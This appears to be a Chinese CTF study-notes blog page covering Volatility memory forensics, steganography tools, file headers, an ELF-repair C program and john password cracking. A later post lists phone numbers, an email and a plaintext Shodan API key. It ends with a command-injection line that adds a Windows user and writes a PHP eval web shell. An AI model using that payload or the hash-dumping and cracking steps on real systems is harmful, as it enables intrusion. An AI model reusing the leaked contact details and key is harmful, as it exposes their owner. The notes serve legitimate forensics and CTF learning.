<p> 跟踪进程号120发现是使用的是nc，同时也看到了cmd的进程，基本可以确定是使用cmd命令行的nc进行文件的传输，于是使用cmdscan插件（通过扫描_COMMAND_HISTORY提取命令历史记录）获取更多的信息： </p>
<p> volatility  cmdscan imageinfo -f 1.raw  –profile=WinXPSP2x86 </p>
<p>所以小黑是使用nc向远程主机192.168.57.14的2333发送了<a href="mailto:P@ssW0rd_is_y0ur_bir7hd4y.zip">P@ssW0rd_is_y0ur_bir7hd4y.zip</a>文件。 </p>
<p>之后便可以memdump插件（转储进程的可寻址内存数据插件）导出使用nc发送的相关数据：</p>
<p> volatility  memdump -p 120 imageinfo -f 1.raw  –profile=WinXPSP2x86  –dump-dir=outdir</p>
<p> <strong>从内存中获得密码hash</strong><br>我们需要知道system和sam key的起始位置，查找上图，copy SYSTEM和SAM位置的第一列，把输出保存到hashs.txt文件中  </p>
<p>volatility  hashdump     imageinfo -f 1.raw  –profile=WinXPSP2x86 -y 0xe1035b60 -s 0xe1469b60 &gt; hash.txt</p>
<p><img src="/2019/11/21/%E9%9A%90%E5%86%99/image-20200724152120996.png" alt="image-20200724152120996"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f 1.raw imageinfo</span><br><span class="line">volatility  -f 1.raw  --profile=WinXPSP2x86   filescan |grep  桌面</span><br><span class="line">volatility  -f 1.raw  --profile=WinXPSP2x86  dumpfiles -Q 0x000000000249ae78  --dump-dir=./</span><br><span class="line">进程扫描：volatility  psscan imageinfo -f 1.raw  –profile=WinXPSP2x86</span><br><span class="line"></span><br><span class="line">导出mspaint进程内存镜像，使用GIMP工具查看当前画图的图像</span><br><span class="line">volatility  -f 1.raw  --profile=WinXPSP2x86   memdump ‐p 332   ‐D ./       不行</span><br><span class="line">volatility  -f 1.raw  --profile=WinXPSP2x86 memdump ‐p 1056 --dump-dir=./</span><br><span class="line"></span><br><span class="line">查看进程。</span><br><span class="line">volatility pslist -f Advertising\ <span class="keyword">for</span>\ Marriage.raw</span><br><span class="line">查看记事本。</span><br><span class="line">volatility notepad -f Advertising\ <span class="keyword">for</span>\ Marriage.raw</span><br><span class="line"></span><br><span class="line">volatility -f 1.raw  –profile=WinXPSP2x86  dumpfiles -Q 0x000000002408c460 -n --dump-dir=./       -n以文件名保存</span><br><span class="line"></span><br><span class="line">对 dumpit.exe 进行分析：</span><br><span class="line">volatility -f mem.raw --profile=Win7SP1x86_23418 memdump -p 1636 -D mem/</span><br><span class="line">dump 下 dumpit.exe 的内存镜像  </span><br><span class="line">直接对dump下来的1636.dmp文件进行binwalk和foremost</span><br></pre></td></tr></table></figure>





<table>
<thead>
<tr>
<th>cmdline/cmdscan</th>
<th>列出历史 cmd 命令</th>
</tr>
</thead>
<tbody><tr>
<td>filescan</td>
<td>扫描文件，可配合 grep 使用</td>
</tr>
<tr>
<td>netscan</td>
<td>扫描建立的连接和套接字，类似于 netstat</td>
</tr>
<tr>
<td>pslist/psscan</td>
<td>列出进程列表</td>
</tr>
<tr>
<td>svcscan</td>
<td>扫描 windows 服务列表</td>
</tr>
<tr>
<td>screenshot</td>
<td>显示 GDI 样式的截屏</td>
</tr>
<tr>
<td>memdump</td>
<td>从内存 dump 进程的内存</td>
</tr>
<tr>
<td>dumpfiles</td>
<td>从内存 dump 文件</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 1.raw imageinfo</span><br></pre></td></tr></table></figure>

<p> 首先我们要看一下出题人在镜像里干了什么。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.data --profile&#x3D;Win7SP1x64 pslist</span><br></pre></td></tr></table></figure>

<p>列举在缓存在内存中的注册表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.vmem --profile&#x3D;WinXPSP2x86 hivelist</span><br></pre></td></tr></table></figure>

<p>获取SAM表中的用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.vmem --profile&#x3D;WinXPSP2x86 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</span><br></pre></td></tr></table></figure>

<p>shell的命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f mem.vmem   --profile&#x3D;WinXPSP2x86 volshell</span><br></pre></td></tr></table></figure>



<p>查看可疑文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.data --profile&#x3D;Win7SP1x64 filescan</span><br></pre></td></tr></table></figure>

<p>查看文档</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.data --profile&#x3D;Win7SP1x64 filescan | grep &quot;doc\|docx\|rtf&quot;</span><br><span class="line">volatility -f mem.data --profile&#x3D;Win7SP1x64 filescan | grep &quot;exe&quot;</span><br></pre></td></tr></table></figure>

<p>查看图片</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.data  --profile&#x3D;Win7SP1x64   filescan | grep     &quot;jpg\|jpeg\|png\|tif\|gif\|bmp&quot;</span><br><span class="line">volatility -f mem.data  –-profile&#x3D;WinXPSP2x86  filescan | grep  -E &#39;jpg|png|jpeg|bmp|gif&#39;</span><br></pre></td></tr></table></figure>

<p>查看桌面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.data --profile&#x3D;Win7SP1x64 filescan | grep &quot;Desktop&quot;</span><br></pre></td></tr></table></figure>

<p>查看截图</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.data --profile&#x3D;Win7SP1x64 screenshot --dump-dir&#x3D;.&#x2F;</span><br></pre></td></tr></table></figure>



<p>查看命令行输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.data --profile&#x3D;Win7SP1x64 cmdline</span><br></pre></td></tr></table></figure>

<p>查看系统用户名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.data --profile&#x3D;Win7SP1x64 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</span><br></pre></td></tr></table></figure>

<p>查看网络连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.data --profile&#x3D;Win7SP1x64 netscan</span><br></pre></td></tr></table></figure>





<h2 id="隐写算法-常见有F5、Guess、JSteg和JPHide等-仅限于jpg图片"><a href="#隐写算法-常见有F5、Guess、JSteg和JPHide等-仅限于jpg图片" class="headerlink" title="隐写算法 常见有F5、Guess、JSteg和JPHide等  仅限于jpg图片"></a>隐写算法 常见有F5、Guess、JSteg和JPHide等  仅限于jpg图片</h2><h3 id="F5-刷新-jpg"><a href="#F5-刷新-jpg" class="headerlink" title="F5  刷新  jpg"></a>F5  刷新  jpg</h3><p>F5隐写全称F5-steganography，在kail系统命令端输入以下代码：<br>git clone <a href="https://github.com/matthewgao/F5-steganography" target="_blank" rel="noopener">https://github.com/matthewgao/F5-steganography</a><br>wget <a href="http://ctf5.shiyanbar.com/stega/123456.jpg" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/stega/123456.jpg</a> 获取图片<br>  在命令窗口输入 java Extract /root/123456.jpg -p 123456</p>
<p>java Extract  F5.jpg  (-p 123456)</p>
<h3 id="outguess-master-猜"><a href="#outguess-master-猜" class="headerlink" title="outguess-master  猜"></a>outguess-master  猜</h3><p>在kali系统中使用outguess-master工具（需要安装），检测是否为guess算法隐写<br>    安装：cd  outguess       git clone <a href="https://github.com/crorvick/outguess" target="_blank" rel="noopener">https://github.com/crorvick/outguess</a><br>1.解压，linux下cd到outguess的文件夹<br>2.最好在root下sudo ./configure &amp;&amp; make &amp;&amp; make install 之后直接用outguess命令就可以使用了<br>    加密：<br>    outguess -k “my secret key” -d hidden.txt demo.jpg out.jpg<br>    加密之后，demo.jpg会覆盖out.jpg,hidden.txt中的内容是要隐藏的东西<br>    解密：<br>    outguess -k “my secret key” -r out.jpg hidden.txt</p>
<p>outguess -k  gemlove -r  sheng_huo_zhao_zhao.jpg  outfile.txt</p>
<p>​    解密之后，解密内容放在hidden.txt中<br>如：outguess -r angrybird.jpg outfile.txt<br>outguess -r /root/Desktop/angrybird.jpg /root/Desktop/outfile.txt</p>
<h3 id="Jshswin工具（jphide工具的一种，还有stegdetect）"><a href="#Jshswin工具（jphide工具的一种，还有stegdetect）" class="headerlink" title="Jshswin工具（jphide工具的一种，还有stegdetect）"></a>Jshswin工具（jphide工具的一种，还有stegdetect）</h3><p>Jphide是基于【最低有效位LSB】的JPEG格式图像隐写算法，使用JPEG图像作为载体是因为相比其他图像格式更不容易发现隐藏信息，因为JPEG图像在DCT变换域上进行隐藏比空间域隐藏更难检测，并且鲁棒性更强，同时Blowfish算法有较强的抗统计检测能力。<br>由于JPEG图像格式使用离散余弦变换（Discrete Cosine<br>Transform，DCT）函数来压缩图像，而这个图像压缩方法的核心是：通过识别每个8×8像素块中相邻像素中的重<br>复像素来减少显示图像所需的位数，并使用近似估算法降低其冗余度。因此，我们可以把DCT看作一个用于执行<br>压缩的近似计算方法。因为丢失了部分数据，所以DCT是一种有损压缩（Loss<br>Compression）技术，但一般不会影响图像的视觉效果。</p>
<p>steghide extract -sf rose.jpg  弱密码：123456</p>
<h3 id="图片长宽比例诡异时"><a href="#图片长宽比例诡异时" class="headerlink" title="图片长宽比例诡异时"></a>图片长宽比例诡异时</h3><p>，可以尝试改图片大小，下面介绍找图片宽度和高度的标志位的方法：<br>A）对于png文件，其第二行第六列是高度位，改这一位即可；<br>B）对于其他格式图片，可以先看看图片的属性，得到宽高值，转成16进制数，搜索该16进制值就能找到标志位了；</p>
<h2 id="杂-1"><a href="#杂-1" class="headerlink" title="杂"></a>杂</h2><p>【】磁盘取证分析环节，先下载安装好磁盘取证工具AccessData FTK Imager<br>***wav隐写-silenteye<br>wav隐写</p>
<p><strong>*avi隐写-MSU VideoStego<br>*</strong>PDF隐写-pdfdetach工具：<br>pdfdetach test.pdf -saveall（还原创建这个pdf的前一个pdf）<br>还原到第一个pdf后 pdfdetach start.pdf -save 1 -o origin.pdf</p>
<p>***vmdk隐写-Dsfok-tools，FTK<br>通常Dsfok-tools是用来编辑vmdk文件中的描述符<br>FTK直接打开文件就可以</p>
<p>***NTFS文件系统ida隐藏-ntfsinfo</p>
<p>***dmp文件隐写<br>在线分析网站：<a href="http://www.osronline.com/page.cfm?name=analyze" target="_blank" rel="noopener">http://www.osronline.com/page.cfm?name=analyze</a> </p>
<h2 id="NTFS流"><a href="#NTFS流" class="headerlink" title="NTFS流"></a>NTFS流</h2><p><code>dir</code></p>
<p><code>dir /a /r</code> 确定该目录下存在ntfs流 </p>
<ol>
<li>将损坏的ELF文件拖入hxd或其他二进制软件中，可发现Magic为0x20,0x45,0x4c,0x46，但正确的ELF文件Magic为0x7f 0x45 0x4c 0x46</li>
</ol>
<h2 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h2><p>CAD (dwg)，文件头：41433130</p>
<p>Adobe Photoshop (psd)，文件头：38425053</p>
<p>Rich Text Format (rtf)，文件头：7B5C727466</p>
<p>XML (xml)，文件头：3C3F786D6C</p>
<p>HTML (html)，文件头：68746D6C3E</p>
<p>Email [thorough only] (eml)，文件头：44656C69766572792D646174653A</p>
<p>Outlook Express (dbx)，文件头：CFAD12FEC5FD746F</p>
<p>Outlook (pst)，文件头：2142444E</p>
<p>MS Word/Excel (xls.or.doc)，文件头：D0CF11E0</p>
<p>MS Access (mdb)，文件头：5374616E64617264204A</p>
<p>WordPerfect (wpd)，文件头：FF575043</p>
<p>Postscript (eps.or.ps)，文件头：252150532D41646F6265</p>
<p>Quicken (qdf)，文件头：AC9EBD8F</p>
<p>Windows Password (pwl)，文件头：E3828596</p>
<p>Wave (wav)，文件头：57415645</p>
<p>AVI (avi)，文件头：41564920</p>
<p>Real Audio (ram)，文件头：2E7261FD</p>
<p>Real Media (rm)，文件头：2E524D46</p>
<p>MPEG (mpg)，文件头：000001BA</p>
<p>MPEG (mpg)，文件头：000001B3</p>
<p>Quicktime (mov)，文件头：6D6F6F76</p>
<p>Windows Media (asf)，文件头：3026B2758E66CF11</p>
<p>MIDI (mid)，文件头：4D546864</p>
<p>2、从winhex中取出的文件头列表</p>
<p>File Type ExtensionsHeader</p>
<p>JPEG jpg;jpeg 0xFFD8FF</p>
<p>PNG png 0x89504E470D0A1A0A</p>
<p>GIF gif GIF8</p>
<p>TIFF tif;tiff 0x49492A00</p>
<p>TIFF tif;tiff 0x4D4D002A</p>
<p>Bit map bmp BM</p>
<p>AOL ART art 0x4A47040E000000</p>
<p>AOL ART art 0x4A47030E000000</p>
<p>PC Paintbrush pcx 0x0A050108</p>
<p>Graphics Metafile wmf 0xD7CDC69A</p>
<p>Graphics Metafile wmf 0x01000900</p>
<p>Graphics Metafile wmf 0x02000900</p>
<p>Enhanced Metafile emf 0x0100000058000000</p>
<p>Corel Draw cdr CDR</p>
<p>CAD dwg 0x41433130</p>
<p>Adobe Photoshop psd 8BPS</p>
<p>Rich Text Format rtf rtf</p>
<p>XML xml</p>
<p>HTML html;htm;PHP;php3;php4;phtml;shtml type</p>
<p>Email eml Delivery-date:</p>
<p>Outlook Express dbx 0xCFAD12FE</p>
<p>Outlookpst!BDN</p>
<p>MS Office/OLE2doc;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db 0xD0CF11E0A1B11AE1</p>
<p>MS Access mdb;mda;mde;mdt Standard J</p>
<p>WordPerfect wpd 0xFF575043</p>
<p>OpenOffice Writer sxw writer</p>
<p>OpenOffice Calc sxc calc</p>
<p>OpenOffice Math sxm math</p>
<p>OpenOffice Impress sxi impress</p>
<p>OpenOffice Draw sxd draw</p>
<p>Adobe FrameMaker fm</p>
<ol>
<li><code>readelf -h &lt;file&gt;</code>指令，获取文件属性，可发现文件为32位可执行文件，且文件类型为ET_NONE，此处需要将文件类型修改为ET_EXEC或ET_DYN，由于难以直接确定地址，可考虑通过脚本修复。</li>
</ol>
<h2 id="elf修复"><a href="#elf修复" class="headerlink" title="elf修复"></a>elf修复</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;elf.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;mman.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;stat.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"> * release: gcc .&#x2F;FileFix.c -m32 -o .&#x2F;FileFix</span><br><span class="line"> * 若提示权限问题，请使用root权限执行</span><br><span class="line"> * 参考资料：《Linux二进制分析》</span><br><span class="line"> * 使用方法：FileFix &lt;filename&gt;</span><br><span class="line"> * *&#x2F;</span><br><span class="line"></span><br><span class="line">int main(int argc,char *argv[])&#123;</span><br><span class="line">    int fd;</span><br><span class="line">    uint8_t *mem;</span><br><span class="line">    struct stat st;</span><br><span class="line"> </span><br><span class="line">    Elf32_Ehdr *ehdr;</span><br><span class="line"></span><br><span class="line">    if(argc &lt; 2)&#123;</span><br><span class="line">        printf(&quot;No input file.\n&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;尝试读取文件</span><br><span class="line">    if((fd &#x3D; open(argv[1],O_RDWR)) &lt; 0)&#123;</span><br><span class="line">        perror(&quot;open&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;校验文件大小</span><br><span class="line">    if(fstat(fd, &amp;st) &lt; 0)&#123;</span><br><span class="line">        perror(&quot;fstat&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;*映射文件到内存*&#x2F;</span><br><span class="line">    mem &#x3D; mmap(NULL,st.st_size,PROT_READ | PROT_WRITE,MAP_SHARED,fd,0);</span><br><span class="line">    if(mem &#x3D;&#x3D; MAP_FAILED)&#123;</span><br><span class="line">        perror(&quot;mmap&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;*识别并修改elf各部分内容*&#x2F;</span><br><span class="line">    ehdr &#x3D; (Elf32_Ehdr *)mem;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;校验标志位</span><br><span class="line">    if(mem[0] !&#x3D; 0x7f &amp;&amp; strcmp(&amp;mem[1],&quot;ELF&quot;))&#123;</span><br><span class="line">	mem[0] &#x3D; 0x7f;</span><br><span class="line">    	mem[1] &#x3D; &#39;E&#39;;</span><br><span class="line">	mem[2] &#x3D; &#39;L&#39;;</span><br><span class="line">	mem[3] &#x3D; &#39;F&#39;;	</span><br><span class="line">        printf(&quot;File &lt;%s&gt; magic has been fixed.\n&quot;,argv[1]);        </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">	printf(&quot;File &lt;%s&gt; magic do not need to fix.\n&quot;,argv[1]);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;检验文件类型是否为可执行（ET_EXEC）</span><br><span class="line">    if(ehdr-&gt;e_type &#x3D;&#x3D; ET_NONE)&#123;</span><br><span class="line">        ehdr-&gt;e_type &#x3D; ET_EXEC;</span><br><span class="line">	printf(&quot;File &lt;%s&gt; head type has been fixed.\n&quot;,argv[1]);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        printf(&quot;File &lt;%s&gt; do not need to fix\n&quot;,argv[1]);</span><br><span class="line">        exit(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;写入文件</span><br><span class="line">    if(munmap((void*)mem,st.st_size) &#x3D;&#x3D; -1)&#123;</span><br><span class="line">        perror(&quot;munmap&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;File &lt;%s&gt; has been fixed\n&quot;,argv[1]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="unique"><a href="#unique" class="headerlink" title="unique"></a>unique</h2><p>unique工具可以从一个密码字典中去除重复行，为我们使用密码字典进行爆破提供了很大的便利。<br>unique -v -inp=allwords.txt uniques.txt<br>Total lines read 6089 Unique lines written 5083</p>
<h2 id="john"><a href="#john" class="headerlink" title="john"></a>john</h2><p>john –format=sha512crypt shadow<br>john –wordlist=uniques.txt –format=sha512crypt shadow  //john字典暴力破解密码<br>john –show  1.txt<br>hashcat</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/21/%E5%B8%B8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhiliya">
      <meta itemprop="description" content="emmmm 感觉没啥好说的">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="zhiliya">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/21/%E5%B8%B8/" class="post-title-link" itemprop="url">常</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-21 20:17:27" itemprop="dateCreated datePublished" datetime="2019-11-21T20:17:27+08:00">2019-11-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-07-19 10:51:50" itemprop="dateModified" datetime="2023-07-19T10:51:50+08:00">2023-07-19</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <center> 13221726781 [861256072@qq.com](mailto:861256072@qq.com)  窝窝头？？？？ 13750703837 14536508 </center>
conda info -e

<p>activate py3</p>
<p>deactivate</p>
<p> r3ver5e    e-&gt;3   s-&gt;5    a-&gt;4，@          i-&gt;1   l  l-&gt;1       o-&gt;0             r-&gt;R            T-&gt;7**     zhiliya-&gt;zhiliy4  0R4ng3</p>
<p>nessus:<a href="https://localhost:8834/#" target="_blank" rel="noopener">https://localhost:8834/#</a><br>shodan的api:PkDlvVwtF7PBT9Fwz2S4o41WMXi0w38l</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">1)、设置用户名：git  config --global  user.name  &#39;github上注册的用户名&#39;;</span><br><span class="line">2)、设置用户邮箱：git config --global user.email &#39;注册时候邮箱</span><br><span class="line">$ git config --global user.name &quot;runoob&quot;</span><br><span class="line">$ git config --global user.email test@runoob.com</span><br><span class="line">3)、校验是否成功 git config --list;</span><br><span class="line"></span><br><span class="line">hexo s    本地部署</span><br><span class="line">localhost:4000</span><br><span class="line"></span><br><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo deploy    github服务器部署</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; [layout] 为布局，可选项为 &#96;post&#96;、&#96;page&#96;、&#96;draft&#96;，这将决定文章所在文件路径。</span><br><span class="line">&#x2F;&#x2F; &lt;title&gt; 为文章标题</span><br><span class="line">&#x2F;&#x2F; 如 hexo new post 除了帅气，我还有啥！</span><br><span class="line">hexo new [layout] &lt;title&gt;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    部署优化</span><br><span class="line"></span><br><span class="line">每次都要执行 hexo clean 和 hexo deploy，不如写个新的脚本</span><br><span class="line">&#x2F;&#x2F; package.json</span><br><span class="line">&quot;dev&quot;: &quot;hexo s&quot;,</span><br><span class="line">&quot;build&quot;: &quot;hexo clean &amp; hexo deploy&quot;</span><br><span class="line"></span><br><span class="line">部署命令</span><br><span class="line">npm run build</span><br></pre></td></tr></table></figure>

<p>u1L战队最近会出版关于CTF书籍《从0到1 CTFer的成长之路》</p>
<p>赛事官网：<a href="https://nctf.x1c.club/" target="_blank" rel="noopener">https://nctf.x1c.club/</a><br>报名时间：Unknown<br>初赛时间：2019年11月22日 18:00 CST — 2019年11月24日 21:00 CST </p>
<p>【wctf  SKCTF PICO CTF bdctf iscc2014 ISG2014 simctf hctf HEBTUCTF hectf  bytectf  jactf】 </p>
<p> 前端安全揭秘 </p>
<p> 安全之路：Web渗透技术及实战案例解析 </p>
<p>)<a href="https://d3ctf.io/" target="_blank" rel="noopener">https://d3ctf.io/</a><br>【QQ群】532023069<br>【时间】<br>众测赛:    11月18日 12:00-11月22日 12:00，<br>        11月25日 12:00-12月08日 12:00<br>线上赛:    11月22日 20:00-11月24日 20:00<br>线下赛:    12月14日-12月15日 </p>
<p>您可以通过以下命令使用自动生成的 Docker 映像：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 8000:8000 -it ctfd&#x2F;ctfd</span><br></pre></td></tr></table></figure>

<p> 【赛事播报】@全体成员 </p>
<p>赛事名称：“安洵杯”第二届网络安全大赛<br>主办单位：四川安洵信息技术有限公司<br>技术支撑：成都信息工程大学 道格安全研究实验室<br>赛事官网：<a href="https://axb.d0g3.cn/" target="_blank" rel="noopener">https://axb.d0g3.cn/</a><br>赛方QQ群：793235129<br>报名时间：2019年11月22日 CST — 不关闭<br>CTF初赛时间：2019年11月30日 09:00 CST — 2019年11月30日 17:00 CST </p>
<ul>
<li><p>网站指纹识别工具Whatweb的使用</p>
</li>
<li><p><code>gobuster</code>的暴力目录猜解工具</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://docker.hackthebox.eu:35066/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,htm</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li>kali一个自带的应用wfuzz，进行对参数名的猜解<br>wfuzz –hh=24 -c  -w /usr/share/dirb/wordlists/big.txt <a href="http://docker.hackthebox.eu:35066/api/action.php?FUZZ=test" target="_blank" rel="noopener">http://docker.hackthebox.eu:35066/api/action.php?FUZZ=test</a><br>-hh 后面接从源码中过滤得到的字符数量<br>-c 带颜色输出</li>
</ul>
<ul>
<li>细数github上开源扫描器集合 <a href="https://mp.weixin.qq.com/s?srcid=&amp;scene=23&amp;sharer_sharetime=1571794634913&amp;mid=2657035055&amp;sharer_shareid=a0821fbb64f9b6fe28363c8f21f6c8f8&amp;sn=76c5f5b1d98a2eab2b898ad38b98cbe0&amp;idx=1&amp;__biz=MzAxNDM3NTM0NQ%3D%3D&amp;chksm=803fc3f1b7484ae77135c68ea82b2b65a00c1efa692394b23221171eb433c923b7230e3c9eaf&amp;mpshare=1#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?srcid=&amp;scene=23&amp;sharer_sharetime=1571794634913&amp;mid=2657035055&amp;sharer_shareid=a0821fbb64f9b6fe28363c8f21f6c8f8&amp;sn=76c5f5b1d98a2eab2b898ad38b98cbe0&amp;idx=1&amp;__biz=MzAxNDM3NTM0NQ%3D%3D&amp;chksm=803fc3f1b7484ae77135c68ea82b2b65a00c1efa692394b23221171eb433c923b7230e3c9eaf&amp;mpshare=1#rd</a> </li>
</ul>
<p>web安全命令执行漏洞 net user test 123456 /add echo ^&lt;?php eval($_POST[a]);?^&gt; &gt; a.php</p>
